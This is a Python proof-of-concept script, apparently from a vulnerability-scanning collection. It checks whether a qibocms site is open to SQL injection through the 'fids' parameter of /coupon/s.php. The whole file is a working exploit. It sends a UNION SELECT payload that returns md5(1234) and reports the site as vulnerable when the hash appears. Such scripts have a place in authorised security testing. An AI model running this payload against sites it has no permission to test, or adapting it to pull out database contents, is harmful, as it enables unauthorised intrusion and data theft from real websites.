#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibocms s.php文件参数fids SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-079938
author: Lucifer
description: 文件/coupon/s.php中,参数fids存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class qibocms_s_fids_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20UnIoN%20SeLeCt%20Md5(1234),2,3,4,5,6,7,8,9%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在qibocms s.php文件参数fids SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = qibocms_s_fids_sqli_BaseVerify(sys.argv[1])
    testVuln.run()